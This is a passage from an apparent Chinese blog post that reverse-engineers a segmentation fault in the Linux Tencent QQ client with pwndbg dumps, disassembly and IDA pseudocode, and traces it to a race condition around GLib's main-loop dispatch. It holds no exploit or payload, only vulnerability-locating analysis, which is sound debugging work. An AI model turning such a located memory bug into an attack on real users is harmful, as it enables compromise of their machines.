<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /40gx $rbx + 8</span><br><span class="line">0x7ffff7000008 &lt;____wcstof128_l_internal+1176&gt;: 0x2444c74820245c89      0x0ff6850000000058</span><br><span class="line">0x7ffff7000018 &lt;____wcstof128_l_internal+1192&gt;: 0xef894c00001c968e      0x448d4c58244c8d48</span><br><span class="line">0x7ffff7000028 &lt;____wcstof128_l_internal+1208&gt;: 0xf90ee8ea89485024      0x8b44ff438d48ffff</span><br><span class="line">0x7ffff7000038 &lt;____wcstof128_l_internal+1224&gt;: 0xdcacbd0f4c20245c      0x2444894800001b58</span><br><span class="line">0x7ffff7000048 &lt;____wcstof128_l_internal+1240&gt;: 0xed85453ff5834918      0x8b48000012c4850f</span><br><span class="line">0x7ffff7000058 &lt;____wcstof128_l_internal+1256&gt;: 0x48240c6348582454      0x01fb834850244c89</span><br></pre></td></tr></table></figure>

<p>然而 call   qword ptr [rbx + 8]这条指令就相当于: call 0x2444c74820245c89, 这个地址是非法地址,所以出现段错误</p>
<h3 id="正常情况调试"><a href="#正常情况调试" class="headerlink" title="正常情况调试"></a>正常情况调试</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────</span><br><span class="line"> RAX  0x0</span><br><span class="line"> RBX  0x7ffff7dc33a0 —▸ 0x7ffff7cdf140 ◂— lock add dword ptr [rdi], 1</span><br><span class="line"> RCX  0x7ffff7d42938 ◂— 0x6f5347007065656b /* &#x27;keep&#x27; */</span><br><span class="line"> RDX  0x7ffff7e450a0 (__pthread_keys) ◂— 0x1</span><br><span class="line"> RDI  0x1392c57a14a0 ◂— 0xffffec6f00000002</span><br><span class="line"> RSI  0x7ffff7ce498d (g_main_context_dispatch+493) ◂— mov    rdi, qword ptr [rsp + 0x18]</span><br><span class="line"> R8   0x1392c57a1520 ◂— 0x0</span><br><span class="line"> R9   0x7fffffffd880 ◂— 0x3000000028 /* &#x27;(&#x27; */</span><br><span class="line"> R10  0x7ffff7fca080</span><br><span class="line"> R11  0x286</span><br><span class="line"> R12  0x1</span><br><span class="line"> R13  0x1392c5ddb900 ◂— 0x0</span><br><span class="line"> R14  0x1392c579fdc0 ◂— 0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x1392c58e8b60 —▸ 0x1392c57a14a0 ◂— 0xffffec6f00000002</span><br><span class="line"> RSP  0x7fffffffd970 —▸ 0x1392c57a14a0 ◂— 0xffffec6f00000002</span><br><span class="line"> RIP  0x7ffff7ce49e5 (g_main_context_dispatch+581) ◂— call   qword ptr [rbx + 8]</span><br><span class="line">──────────────────────────────────────────[ DISASM ]──────────────────────────────────────────</span><br><span class="line"> ► 0x7ffff7ce49e5 &lt;g_main_context_dispatch+581&gt;    call   qword ptr [rbx + 8]</span><br><span class="line"> </span><br><span class="line">   0x7ffff7ce49e8 &lt;g_main_context_dispatch+584&gt;    mov    rdi, r14</span><br><span class="line">   0x7ffff7ce49eb &lt;g_main_context_dispatch+587&gt;    call   g_mutex_lock &lt;0x7ffff7d32250&gt;</span><br></pre></td></tr></table></figure>

<p>通过以上观察, rbx指向的是0x7ffff7cdf140, 则 rbx + 8内存信息如下</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /40gx $rbx + 8</span><br><span class="line">0x7ffff7dc33a8: 0x00007ffff7cdf270      0x00007ffff7cdef50</span><br><span class="line">0x7ffff7dc33b8: 0x0000000000000000      0x00001392c618e070</span><br><span class="line">0x7ffff7dc33c8: 0x00007ffff7ce0650      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>指向的内存如下:</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /40gx 0x00007ffff7cdf270</span><br><span class="line">0x7ffff7cdf270: 0x66c30a74012f83f0      0x0000000000841f0f</span><br><span class="line">0x7ffff7cdf280: 0xfd894818478b4855      0x7f8b480674c08548</span><br><span class="line">0x7ffff7cdf290: 0xe95def8948d0ff10      0x001f0f90ffffffc4</span><br><span class="line">0x7ffff7cdf2a0: 0x2e6690ffffffbbe9      0x0000000000841f0f</span><br><span class="line">0x7ffff7cdf2b0: 0x15fffb8953555441      0x48fb6348000e361c</span><br><span class="line">0x7ffff7cdf2c0: 0x8b44000e485a158d      0x000001b8c5894820</span><br><span class="line">0x7ffff7cdf2d0: 0x0587ba0c87c18900      0x25058b48000e4948</span><br><span class="line">0x7ffff7cdf2e0: 0x0080b88b48000e48      0x4400047fb1e80000</span><br><span class="line">0x7ffff7cdf2f0: 0xc35c415d5b006589      0x0000000000841f0f</span><br><span class="line">0x7ffff7cdf300 &lt;g_clear_handle_id&gt;:     0x1074c08545078b44      0x89440000000007c7</span><br><span class="line">0x7ffff7cdf310 &lt;g_clear_handle_id+16&gt;:  0x0000441f0fe6ffc7      0x00000000801f0fc3</span><br><span class="line">0x7ffff7cdf320 &lt;g_get_real_time&gt;:       0x4864f63128ec8348      0x480000002825048b</span><br><span class="line">0x7ffff7cdf330 &lt;g_get_real_time+16&gt;:    0x8948c03118244489      0x48000e37e115ffe7</span><br><span class="line">0x7ffff7cdf340 &lt;g_get_real_time+32&gt;:    0x48000f4240240469      0x24548b4808244403</span><br><span class="line">0x7ffff7cdf350 &lt;g_get_real_time+48&gt;:    0x002825142b486418      0x28c4834805750000</span><br><span class="line">0x7ffff7cdf360 &lt;g_get_real_time+64&gt;:    0x66000e372915ffc3      0x0000000000841f0f</span><br><span class="line">0x7ffff7cdf370 &lt;g_main_context_query&gt;:  0x495641d789495741      0x41fd89495541ce89</span><br><span class="line">0x7ffff7cdf380 &lt;g_main_context_query+16&gt;:       0xf38953c589445554      0x2ebee86708ec8348</span><br><span class="line">0x7ffff7cdf390 &lt;g_main_context_query+32&gt;:       0x854860458b490005      0x31000000c1840fc0</span><br><span class="line">0x7ffff7cdf3a0 &lt;g_main_context_query+48&gt;:       0x2e6634ebe43145f6      0x0000000000841f0f</span><br></pre></td></tr></table></figure>

<p>单步执行</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">RAX  0x0</span><br><span class="line">RBX  0x7ffff7dc33a0 —▸ 0x7ffff7cdf140 ◂— lock add dword ptr [rdi], 1</span><br><span class="line">RCX  0x7ffff7d42930 ◂— 0x796f7274736564 /* &#x27;destroy&#x27; */</span><br><span class="line">RDX  0x7ffff7e450a0 (__pthread_keys) ◂— 0x1</span><br><span class="line">RDI  0x99bbfa157a0 ◂— 0xfffff66600000002</span><br><span class="line">RSI  0x7ffff7ce498d (g_main_context_dispatch+493) ◂— mov    rdi, qword ptr [rsp + 0x18]</span><br><span class="line">R8   0x99bbf7f2380 ◂— 0x0</span><br><span class="line">R9   0x7fffede4d9e0 ◂— 0x3000000028 /* &#x27;(&#x27; */</span><br><span class="line">R10  0x7ffff7fca080</span><br><span class="line">R11  0x286</span><br><span class="line">R12  0x0</span><br><span class="line">R13  0x99bbf9eb250 ◂— 0x0</span><br><span class="line">R14  0x99bbf9f9e70 ◂— 0x0</span><br><span class="line">R15  0x1</span><br><span class="line">RBP  0x99bbf9fc4e0 —▸ 0x99bbfa157a0 ◂— 0xfffff66600000002</span><br><span class="line">RSP  0x7fffede4dac8 —▸ 0x7ffff7ce49e8 (g_main_context_dispatch+584) ◂— mov    rdi, r14</span><br><span class="line">RIP  0x7ffff7cdf270 ◂— lock sub dword ptr [rdi], 1</span><br><span class="line"></span><br><span class="line">► 0x7ffff7cdf270                                  lock sub dword ptr [rdi], 1</span><br><span class="line">   ↓</span><br><span class="line">  0x7ffff7cdf276                                  ret    </span><br><span class="line">   ↓</span><br><span class="line">  0x7ffff7ce49e8 &lt;g_main_context_dispatch+584&gt;    mov    rdi, r14</span><br><span class="line">  0x7ffff7ce49eb &lt;g_main_context_dispatch+587&gt;    call   g_mutex_lock &lt;0x7ffff7d32250&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到, 原来rbx + 8处的内存储存的是一个该处指令的地址, 这里采用lock sub指令进行对线程使用数 - 1, rdi 指向的是被锁的线程.目前为2</p>
<p>lock前缀指令详解</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LOCK指令前缀会设置处理器的LOCK#信号（译注：这个信号会使总线锁定，阻止其他处理器接管总线访问内存），直到使用LOCK前缀的指令执行结束，这会使这条指令的执行变为原子操作。在多处理器环境下，设置LOCK#信号能保证某个处理器对共享内存的独占使用。</span><br><span class="line">LOCK指令前缀只能用于以下指令，并且要求指令目的操作数为内存操作数，如果源操作数为内存操作数，就会产生undefined opcode异常：ADD, ADC, AND, BTC, BTR, BTS, CMPXCHG, CMPXCH8B,CMPXCHG16B, DEC, INC, NEG, NOT, OR, SBB, SUB, XOR, XADD, XCHG。LOCK指令前缀用于其他任何指令时，也会产生如果源操作数为内存操作数，就会产生undefined opcode异常。另外，XCHG指令默认会设置LOCK#信号，无论是否使用LOCK指令前缀。</span><br><span class="line">LOCK指令前缀经常用于BTS指令，用来在共享内存进行一次read-modify-write操作。</span><br><span class="line">从P6处理器家族开始，如果使用了LOCK指令前缀的指令要访问的目的地址的内容已经缓存在了cache中，那么LOCK#信号一般就不会被设置，但是当前处理器的cache会被锁定，然后缓存一致性（cache coherency ）机制会自动确保操作的原子性。</span><br></pre></td></tr></table></figure>



<p>从g_main_context_dispatch结束的可疑地址1</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────</span><br><span class="line"> RAX  0x1</span><br><span class="line"> RBX  0x1665cdb9ed01 ◂— 0x0</span><br><span class="line"> RCX  0x7fffffffdac0 —▸ 0x1665cdb9edc8 —▸ 0x5555570bdcb0 —▸ 0x55555617bf10 ◂— push   rbp</span><br><span class="line"> RDX  0x7ffff7da0251 ◂— &#x27;non-blocking&#x27;</span><br><span class="line"> RDI  0x1665cda0ddc0 ◂— 0x0</span><br><span class="line"> RSI  0x1</span><br><span class="line"> R8   0x1665cda0f520 ◂— 0x0</span><br><span class="line"> R9   0x7fffffffd920 ◂— 0x3000000028 /* &#x27;(&#x27; */</span><br><span class="line"> R10  0x7ffff7fca080</span><br><span class="line"> R11  0x286</span><br><span class="line"> R12  0x7fffffffdce8 ◂— &#x27;2.0.0-b2&#x27;</span><br><span class="line"> R13  0x7fffffffdc80 —▸ 0x1665cdb9edd0 —▸ 0x5555570bdd00 —▸ 0x55555617bf20 ◂— push   rbp</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x1665cdb8d2d0 —▸ 0x5555570bc718 —▸ 0x555556151e10 ◂— push   rbp</span><br><span class="line"> RBP  0x7fffffffdb00 —▸ 0x7fffffffdb30 —▸ 0x7fffffffdbc0 —▸ 0x7fffffffdf10 —▸ 0x55555709abe0 ◂— ...</span><br><span class="line"> RSP  0x7fffffffdac0 —▸ 0x1665cdb9edc8 —▸ 0x5555570bdcb0 —▸ 0x55555617bf10 ◂— push   rbp</span><br><span class="line"> RIP  0x55555615201a ◂— jne    0x555556152063</span><br><span class="line">──────────────────────────────────────────[ DISASM ]──────────────────────────────────────────</span><br><span class="line">   0x7ffff7ce3144 &lt;g_main_context_iteration+68&gt;    pop    rbp</span><br><span class="line">   0x7ffff7ce3145 &lt;g_main_context_iteration+69&gt;    pop    r12</span><br><span class="line">   0x7ffff7ce3147 &lt;g_main_context_iteration+71&gt;    ret    </span><br><span class="line">    ↓</span><br><span class="line">   0x555556152012                                  mov    rcx, qword ptr [r15 + 8]</span><br><span class="line">   0x555556152016                                  cmp    byte ptr [rcx + 8], 0</span><br><span class="line"> ► 0x55555615201a                                  jne    0x555556152063</span><br><span class="line">    ↓</span><br><span class="line">   0x55555615201e                                  setne  bl</span><br><span class="line">   0x555556152021                                  mov    rdi, qword ptr [rcx]</span><br><span class="line">   0x555556152024                                  mov    rax, qword ptr [rdi]</span><br><span class="line">   0x555556152027                                  call   qword ptr [rax + 0x20]</span><br><span class="line"> </span><br><span class="line">   0x55555615202a                                  mov    rcx, qword ptr [r15 + 8]</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>程序vmmap</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x555555554000     0x555555b69000 r--p   615000 0      /opt/tencent-qq/qq</span><br><span class="line">   0x555555b69000     0x5555570a6000 r-xp  153d000 614000 /opt/tencent-qq/qq</span><br><span class="line">   0x5555570a6000     0x55555710d000 r--p    67000 1b50000 /opt/tencent-qq/qq</span><br><span class="line">   0x55555710d000     0x555557119000 rw-p     c000 1bb6000 /opt/tencent-qq/qq</span><br><span class="line">   0x555557119000     0x55555717a000 rw-p    61000 0      [heap]</span><br><span class="line">   ....</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>程序基址为: 0x555555554000</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &#x2F;x 0x555556152012 - 0x555555554000</span><br><span class="line">$4 &#x3D; 0xbfe012</span><br></pre></td></tr></table></figure>



<p>可疑问题偏移地址:</p>
<p>0xbfe012</p>
<p>找到该调处用汇编代码如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">0x00bfdfa0      push rbp</span><br><span class="line">0x00bfdfa1      mov rbp, rsp</span><br><span class="line">0x00bfdfa4      push r15</span><br><span class="line">0x00bfdfa6      push r14</span><br><span class="line">0x00bfdfa8      push rbx</span><br><span class="line">0x00bfdfa9      sub rsp, 0x28</span><br><span class="line">0x00bfdfad      mov r15, rdi</span><br><span class="line">0x00bfdfb0      movaps xmm0, xmmword [0x00122f40]</span><br><span class="line">0x00bfdfb7      movaps xmmword [rbp - 0x40], xmm0</span><br><span class="line">0x00bfdfbb      xorps xmm0, xmm0</span><br><span class="line">0x00bfdfbe      movaps xmmword [rbp - 0x30], xmm0</span><br><span class="line">0x00bfdfc2      mov qword [rbp - 0x40], rsi</span><br><span class="line">0x00bfdfc6      mov byte [rbp - 0x38], 0</span><br><span class="line">0x00bfdfca      mov r14, qword [rdi + 8]</span><br><span class="line">0x00bfdfce      test r14, r14</span><br><span class="line">0x00bfdfd1      je 0xbfdfdc</span><br><span class="line">0x00bfdfd3      mov eax, dword [r14 + 0xc]</span><br><span class="line">0x00bfdfd7      add eax, 1</span><br><span class="line">0x00bfdfda      jmp 0xbfdfe1</span><br><span class="line">0x00bfdfdc      mov eax, 1</span><br><span class="line">0x00bfdfe1      mov dword [rbp - 0x34], eax</span><br><span class="line">0x00bfdfe4      lea rax, [rbp - 0x40]</span><br><span class="line">0x00bfdfe8      mov qword [r15 + 8], rax</span><br><span class="line">0x00bfdfec      mov rdi, qword [r15 + 0x10]</span><br><span class="line">0x00bfdff0      xor esi, esi</span><br><span class="line">0x00bfdff2      jmp 0xbfe00d</span><br><span class="line">0x00bfdff4      nop word cs:[rax + rax]</span><br><span class="line">0x00bfdffe      nop</span><br><span class="line">0x00bfe000      test dl, dl</span><br><span class="line">0x00bfe002      jne 0xbfe063</span><br><span class="line">0x00bfe004      xor al, 1</span><br><span class="line">0x00bfe006      mov rdi, qword [r15 + 0x10]</span><br><span class="line">0x00bfe00a      movzx esi, al</span><br><span class="line">0x00bfe00d      call g_main_context_iteration ; sym.imp.g_main_context_iteration ; 调用</span><br><span class="line">0x00bfe012      mov rcx, qword [r15 + 8]</span><br><span class="line">0x00bfe016      cmp byte [rcx + 8], 0</span><br><span class="line">0x00bfe01a      jne 0xbfe063</span><br><span class="line">0x00bfe01c      test eax, eax</span><br><span class="line">0x00bfe01e      setne bl</span><br><span class="line">0x00bfe021      mov rdi, qword [rcx]</span><br><span class="line">0x00bfe024      mov rax, qword [rdi]</span><br><span class="line">0x00bfe027      call qword [rax + 0x20]</span><br><span class="line">0x00bfe02a      mov rcx, qword [r15 + 8]</span><br><span class="line">0x00bfe02e      mov qword [rcx + 0x10], rax</span><br><span class="line">0x00bfe032      mov qword [rcx + 0x18], rdx</span><br><span class="line">0x00bfe036      mov rcx, qword [r15 + 8]</span><br><span class="line">0x00bfe03a      cmp qword [rcx + 0x10], 0</span><br><span class="line">0x00bfe03f      sete al</span><br><span class="line">0x00bfe042      or al, bl</span><br><span class="line">0x00bfe044      movzx edx, byte [rcx + 8]</span><br><span class="line">0x00bfe048      test dl, dl</span><br><span class="line">0x00bfe04a      jne 0xbfe000</span><br><span class="line">0x00bfe04c      test al, al</span><br><span class="line">0x00bfe04e      jne 0xbfe000</span><br><span class="line">0x00bfe050      mov rdi, qword [rcx]</span><br><span class="line">0x00bfe053      mov rax, qword [rdi]</span><br><span class="line">0x00bfe056      call qword [rax + 0x38]</span><br><span class="line">0x00bfe059      mov rcx, qword [r15 + 8]</span><br><span class="line">0x00bfe05d      cmp byte [rcx + 8], 0</span><br><span class="line">0x00bfe061      je 0xbfe004</span><br><span class="line">0x00bfe063      mov qword [r15 + 8], r14</span><br><span class="line">0x00bfe067      add rsp, 0x28</span><br><span class="line">0x00bfe06b      pop rbx</span><br><span class="line">0x00bfe06c      pop r14</span><br><span class="line">0x00bfe06e      pop r15</span><br><span class="line">0x00bfe070      pop rbp</span><br><span class="line">0x00bfe071      ret</span><br><span class="line">0x00bfe072      int3</span><br><span class="line">0x00bfe073      int3</span><br></pre></td></tr></table></figure>



<p>IDA伪c代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> __fastcall <span class="title">sub_BFDFA0</span><span class="params">(__int64 a1, __int64 a2)</span> <span class="comment">//**************  段错误触发函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// r15</span></span><br><span class="line">  __int64 v3; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rdx</span></span><br><span class="line">  _BYTE *v9; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">bool</span> v10; <span class="comment">// bl</span></span><br><span class="line">  __int64 v11; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v12; <span class="comment">// rdx</span></span><br><span class="line">  _QWORD *v13; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v14; <span class="comment">// rdx</span></span><br><span class="line">  __int128 v16; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  __int128 v17; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v2 = a1;</span><br><span class="line">  v16 = xmmword_122F40;</span><br><span class="line">  v17 = <span class="number">0L</span>L;</span><br><span class="line">  *(_QWORD *)&amp;v16 = a2;</span><br><span class="line">  BYTE8(v16) = <span class="number">0</span>;</span><br><span class="line">  v3 = *(_QWORD *)(a1 + <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    v4 = *(_DWORD *)(v3 + <span class="number">12</span>) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v4 = <span class="number">1</span>;</span><br><span class="line">  HIDWORD(v16) = v4;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">8</span>) = &amp;v16;</span><br><span class="line">  v5 = *(_QWORD *)(a1 + <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; ; i = (<span class="keyword">unsigned</span> __int8)(v7 ^ <span class="number">1</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v7) = g_main_context_iteration(v5, i); <span class="comment">//**************  段错误触发函数</span></span><br><span class="line">    v9 = *(_BYTE **)(v2 + <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v9[<span class="number">8</span>] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v10 = (_DWORD)v7 != <span class="number">0</span>;</span><br><span class="line">    v7 = (*(__int64 (__cdecl **)(_QWORD, __int64, __int64, _BYTE *))(**(_QWORD **)v9 + <span class="number">32L</span>L))(*(_QWORD *)v9, i, v8, v9);</span><br><span class="line">    v11 = *(_QWORD *)(v2 + <span class="number">8</span>);</span><br><span class="line">    *(_QWORD *)(v11 + <span class="number">16</span>) = v7;</span><br><span class="line">    *(_QWORD *)(v11 + <span class="number">24</span>) = v12;</span><br><span class="line">    v13 = *(_QWORD **)(v2 + <span class="number">8</span>);</span><br><span class="line">    LOBYTE(v7) = v10 || v13[<span class="number">2</span>] == <span class="number">0L</span>L;</span><br><span class="line">    v14 = *((<span class="keyword">unsigned</span> __int8 *)v13 + <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (_BYTE)v14 || (_BYTE)v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (_BYTE)v14 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      LOBYTE(v7) = (*(__int64 (__cdecl **)(_QWORD, __int64, __int64, _QWORD *))(*(_QWORD *)*v13 + <span class="number">56L</span>L))(</span><br><span class="line">                     *v13,</span><br><span class="line">                     i,</span><br><span class="line">                     v14,</span><br><span class="line">                     v13);</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(*(_QWORD *)(v2 + <span class="number">8</span>) + <span class="number">8L</span>L) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = *(_QWORD *)(v2 + <span class="number">16</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *(_QWORD *)(v2 + <span class="number">8</span>) = v3;</span><br><span class="line">  <span class="keyword">return</span> v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现在该函数中,没有加入线程锁, 多线程时条件竞争时导致出现内存错误.</p>
<p>最初漏洞所在: </p>
<p>在&lt;g_main_context_dispatch+581&gt;    call   qword ptr [rbx + 8]的地方出现内存错误.</p>
<p>该g_main_context_dispatch函数为g_main_context_iteration所调用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">│  &gt;0x7ffff7ce49b9 &lt;g_main_context_dispatch+537&gt;    lea    r8,[rip+0xbb8c5]</span><br><span class="line">│   0x7ffff7ce49c0 &lt;g_main_context_dispatch+544&gt;    lea    rdx,[rip+0x546aa]</span><br><span class="line">│   0x7ffff7ce49c7 &lt;g_main_context_dispatch+551&gt;    call   0x7ffff7d34ad0</span><br><span class="line">│   0x7ffff7ce49cc &lt;g_main_context_dispatch+556&gt;    mov    rax,QWORD PTR [rsp+0x18]</span><br><span class="line">│   0x7ffff7ce49d1 &lt;g_main_context_dispatch+561&gt;    sub    DWORD PTR [r13+0x0],0x1</span><br><span class="line">│   0x7ffff7ce49d6 &lt;g_main_context_dispatch+566&gt;    mov    QWORD PTR [r13+0x8],rax</span><br><span class="line">│   0x7ffff7ce49da &lt;g_main_context_dispatch+570&gt;    pop    rcx</span><br><span class="line">│   0x7ffff7ce49db &lt;g_main_context_dispatch+571&gt;    pop    rsi</span><br><span class="line">│   0x7ffff7ce49dc &lt;g_main_context_dispatch+572&gt;    test   rbx,rbx</span><br><span class="line">│   0x7ffff7ce49df &lt;g_main_context_dispatch+575&gt;    